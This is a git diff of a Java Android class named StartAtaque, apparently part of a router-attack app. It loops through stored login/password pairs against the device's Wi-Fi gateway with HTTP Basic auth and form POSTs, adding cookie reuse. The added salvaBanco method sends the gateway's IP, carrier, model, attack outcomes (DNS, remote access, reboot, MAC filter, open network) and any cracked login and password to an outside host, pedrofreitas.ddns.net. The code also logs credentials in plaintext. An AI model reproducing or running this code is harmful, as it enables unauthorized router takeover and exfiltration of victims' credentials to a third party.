@@ -5,9 +5,9 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.UnsupportedEncodingException;
-import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
 import java.net.URL;
+import java.net.URLConnection;
 import java.util.ArrayList;
 import java.util.Iterator;
 import java.util.List;
@@ -17,11 +17,19 @@ import org.apache.http.HttpEntity;
 import org.apache.http.HttpResponse;
 import org.apache.http.NameValuePair;
 import org.apache.http.client.ClientProtocolException;
+import org.apache.http.client.CookieStore;
 import org.apache.http.client.HttpClient;
 import org.apache.http.client.entity.UrlEncodedFormEntity;
+import org.apache.http.client.methods.HttpGet;
 import org.apache.http.client.methods.HttpPost;
+import org.apache.http.client.protocol.ClientContext;
+import org.apache.http.cookie.Cookie;
+import org.apache.http.impl.client.AbstractHttpClient;
+import org.apache.http.impl.client.BasicCookieStore;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.message.BasicNameValuePair;
+import org.apache.http.protocol.BasicHttpContext;
+import org.apache.http.protocol.HttpContext;
 
 import android.app.ProgressDialog;
 import android.content.Context;
@@ -52,6 +60,12 @@ public class StartAtaque extends AsyncTask<Void, String, Integer> {
 	private boolean mConectou;
 	
 	private int mCountAtaques; 
+	
+	private URL urlSalvaBanco;
+	private String urlInsereDado = "http://pedrofreitas.ddns.net/insereinfo.php?";	
+
+	private CookieStore cookieStore;
+	private List<Cookie> cookies;
 	
 	
 	public StartAtaque(Context mContext, Dado mDado, ArrayList<Login> mListLogin, ArrayList<Ataque> mListAtaque, int mCountAtaques, Intent it) {
@@ -105,6 +119,8 @@ public class StartAtaque extends AsyncTask<Void, String, Integer> {
 			
 			mCountPostGet = 0;
 			boolean erro = false;
+			
+			cookies = null;
 
 			while(mCountPostGet < mListPostGet.size() && !erro) {	
 				
@@ -119,25 +135,53 @@ public class StartAtaque extends AsyncTask<Void, String, Integer> {
 				
 				if(auxPostGet.getTipo().contains("get")) {	
 					
-					try {
-						URL url = new URL ("http://" + mDado.getGateway() + auxPostGet.getComando()); 
-						Log.i("URL_LOGIN_" + mCountAtaques + "_" + mCountUsuarios, "http://" + mDado.getGateway() + auxPostGet.getComando());
-						HttpURLConnection connection = (HttpURLConnection) url.openConnection();	
-						//connection.setRequestMethod("GET");
-						//connection.setDoOutput(true);				
+					HttpGet httpGet = new HttpGet("http://" + mDado.getGateway() + auxPostGet.getComando());
+					
+					Log.i("URL_LOGIN_" + mCountAtaques + "_" + mCountUsuarios, "http://" + mDado.getGateway() + auxPostGet.getComando());
+
+					if(auxPostGet.getUsa_login() == 1) {
+						byte[] encodedBytes = Base64.encodeBase64(mListLogin.get(mCountUsuarios).getLoginESenha().getBytes());
+						String encoding = new String(encodedBytes);
+						Log.i("ENCODING_LOGIN_" + mCountAtaques + "_" + mCountUsuarios, encoding + "(" + mListLogin.get(mCountUsuarios).getLoginESenha() + ")");
+						httpGet.setHeader("Authorization", "Basic " + encoding);
+					}
+					
+					HttpClient httpClient = new DefaultHttpClient();
+					HttpContext localContext = new BasicHttpContext();	
+					HttpResponse httpResponse = null;
+					try {							
 						
-						if(auxPostGet.getUsa_login() == 1) {
-							byte[] encodedBytes = Base64.encodeBase64(mListLogin.get(mCountUsuarios).getLoginESenha().getBytes());
-							String encoding = new String(encodedBytes);
-							Log.i("ENCODING_LOGIN_" + mCountAtaques + "_" + mCountUsuarios, encoding + "(" + mListLogin.get(mCountUsuarios).getLoginESenha() + ")");
-							connection.setRequestProperty("Authorization", "Basic " + encoding);
-						}
+						if(auxAtaque.getUsa_cookie() == 1) {
+							if(cookies == null) {
+//								httpResponse = httpClient.execute(httpGet);									
+								cookieStore = ((AbstractHttpClient) httpClient).getCookieStore();
+								cookies = cookieStore.getCookies();
+								Log.i("COOKIE", "Salvo");	
+								
+								httpResponse = httpClient.execute(httpGet);									
+							} else {
+								for (Cookie cookie: cookies) {
+									Log.i("COOKIE_VERSION", cookie.getVersion() + "");
+									Log.i("COOKIE_NAME", cookie.getName());
+									Log.i("COOKIE_VALUE", cookie.getValue());
+									Log.i("COOKIE_DOMAIN", cookie.getDomain());
+									Log.i("COOKIE_PATH", cookie.getPath());
+									Log.i("COOKIE_EXPIRY", cookie.getExpiryDate() + "");	
+								}
+								localContext.setAttribute(ClientContext.COOKIE_STORE, cookieStore);
+								httpResponse = httpClient.execute(httpGet, localContext);	
+							}								
+						} else {
+							httpResponse = httpClient.execute(httpGet);								
+						}			
+												
+						Log.i("RESPONSE_STATUS_" + mCountAtaques, httpResponse.getStatusLine() + "");
 						
-						Log.i("RESPONSE_CODE_" + mCountAtaques + "_" + mCountUsuarios, connection.getResponseCode() +":" + connection.getResponseMessage());
+						HttpEntity responseEntity = httpResponse.getEntity();
 						
-						erro = true;
+						erro = true;							
 						
-						InputStream content = (InputStream) connection.getInputStream();
+						InputStream content = (InputStream) responseEntity.getContent();
 						BufferedReader in = new BufferedReader (new InputStreamReader(content));				
 						String line;							
 						
@@ -150,24 +194,26 @@ public class StartAtaque extends AsyncTask<Void, String, Integer> {
 						}
 						in.close();
 						content.close();
-														
+						
 						if(erro) {
 							mCountUsuarios++;
 						}
-					
-					} catch (MalformedURLException e) {
-						Log.e("ERR_LOGIN_" + mCountAtaques + "_" + mCountUsuarios, "MalformedURLException", e);
+						
+					} catch (ClientProtocolException e) {
+						Log.e("ERR_LOGIN_" + mCountAtaques + "_" + mCountUsuarios, "ClientProtocolException", e);
 						erro = true;
 						mCountUsuarios++;
 					} catch (IOException e) {
 						Log.e("ERR_LOGIN_" + mCountAtaques + "_" + mCountUsuarios, "IOException", e);
 						erro = true;
 						mCountUsuarios++;
-					}
+					} finally {
+						httpClient.getConnectionManager().shutdown();
+					}	
+					
 				} else {
 					if(auxPostGet.getTipo().contains("post")) {	
 						
-						HttpClient httpClient = new DefaultHttpClient();
 						HttpPost httpPost = new HttpPost("http://" + mDado.getGateway() + auxPostGet.getComando());
 				
 						Log.i("URL_LOGIN_" + mCountAtaques + "_" + mCountUsuarios, "http://" + mDado.getGateway() + auxPostGet.getComando());
@@ -205,9 +251,35 @@ public class StartAtaque extends AsyncTask<Void, String, Integer> {
 							}
 						}							
 						
+						HttpClient httpClient = new DefaultHttpClient();
+						HttpContext localContext = new BasicHttpContext();	
 						HttpResponse httpResponse;
 						try {
-							httpResponse = httpClient.execute(httpPost);
+							
+							if(auxAtaque.getUsa_cookie() == 1) {
+								if(cookies == null) {							
+//									httpResponse = httpClient.execute(httpPost);
+									cookieStore = ((AbstractHttpClient) httpClient).getCookieStore();
+									cookies = cookieStore.getCookies();										
+									Log.i("COOKIE", "Salvo");
+									
+									httpResponse = httpClient.execute(httpPost);
+								} else {
+									for (Cookie cookie: cookies) {
+										Log.i("COOKIE_VERSION", cookie.getVersion() + "");
+										Log.i("COOKIE_NAME", cookie.getName());
+										Log.i("COOKIE_VALUE", cookie.getValue());
+										Log.i("COOKIE_DOMAIN", cookie.getDomain());
+										Log.i("COOKIE_PATH", cookie.getPath());
+										Log.i("COOKIE_EXPIRY", cookie.getExpiryDate() + "");						
+									}	
+									
+									localContext.setAttribute(ClientContext.COOKIE_STORE, cookieStore);
+									httpResponse = httpClient.execute(httpPost, localContext);										
+								}									
+							} else {
+								httpResponse = httpClient.execute(httpPost);
+							}
 							
 							Log.i("RESPONSE_STATUS_" + mCountAtaques + "_" + mCountUsuarios, httpResponse.getStatusLine() + "");
 							
@@ -241,7 +313,9 @@ public class StartAtaque extends AsyncTask<Void, String, Integer> {
 							Log.e("ERR_LOGIN_" + mCountAtaques + "_" + mCountUsuarios, "IOException", e);
 							erro = true;
 							mCountUsuarios++;
-						}
+						} finally {
+							httpClient.getConnectionManager().shutdown();
+						}	
 						
 					} else {
 						Log.e("ERR_LOGIN_" + mCountAtaques, "Comando HTTP nao identificado");
@@ -286,22 +360,30 @@ public class StartAtaque extends AsyncTask<Void, String, Integer> {
 			new FinishAtaque(mContext, mIdDadoAtaque, mListAtaque, mCountTipoAtaques, it).execute();	
 		} else {
 			//A lista de ataques terminou e nao foi possivel logar 
-			if(mCountAtaques == mListAtaque.size()) {
+			if(mCountAtaques == mListAtaque.size() - 1) {
 				mDado.setLogin("nao identificado");
 				mDado.setSenha("nao identificada");
-				mDadoDao.update(mDado);	
-				mIdDadoAtaque = mDadoDao.insert(mDado);		
 				
-//				mDadoDao.getAll();
+				mDado.setFabricante_modelo("nao identificado");
 				
+				mDado.setReboot_ataque(0);
+				mDado.setDns_ataque(0);
+				mDado.setAcesso_remoto_ataque(0);
+				mDado.setFiltro_mac_ataque(0);
+				mDado.setAbrir_rede_ataque(0);
+
 				Log.i("DADO", mDado.toString());	
 				
-				mListAtaque = null;
-				mCountAtaques = 0;
-				new FinishAtaque(mContext, mIdDadoAtaque, mListAtaque, mCountTipoAtaques, it).execute();	
+				mIdDadoAtaque = mDadoDao.insert(mDado);					
+//				mDadoDao.getAll();
+				
+				Dado auxDado = mDadoDao.getDadoWithId(mIdDadoAtaque);
+				salvaBanco(auxDado);	
+//				mContext.startActivity(it);			
+				
 			} else {
 				//Nao foi possivel logar, tenta outro ataque
-				if(mCountAtaques < mListAtaque.size()) {
+				if(mCountAtaques < mListAtaque.size() - 1) {
 //					mDadoDao.getAll();
 					
 					mCountAtaques++;
@@ -309,6 +391,22 @@ public class StartAtaque extends AsyncTask<Void, String, Integer> {
 				}
 			}
 		}			
+	}
+	
+	public void salvaBanco(Dado auxDado) {	
+		try {
+			urlSalvaBanco = new URL (urlInsereDado + "ip=" + auxDado.getIp() + "&gateway=" + auxDado.getGateway() + "&operadora=" + auxDado.getOperadora() + 
+							"&data=" + auxDado.getData() + "&fabricante_modelo=" + auxDado.getFabricante_modelo() + "&reboot_ataque" + auxDado.getReboot_ataque() +
+							"&dns_ataque=" + auxDado.getDns_ataque() + "&acesso_remoto_ataque=" + auxDado.getAcesso_remoto_ataque() + "&filtro_mac_ataque=" +	auxDado.getFiltro_mac_ataque() +
+							"&abrir_rede_ataque=" + auxDado.getAbrir_rede_ataque() + "&login=" + auxDado.getLogin() + "&senha=" + auxDado.getSenha());
+			URLConnection connectionSalva = (URLConnection) urlSalvaBanco.openConnection();
+		} catch (MalformedURLException e) {
+			Log.e("ERR_SALVAR", "MalformedURLException", e);
+		} catch (IOException e) {
+			Log.e("ERR_SALVAR", "IOException", e);
+		}
+		
+		Log.i("DADO_SALVO", auxDado.toString());
 	}
 	
 }
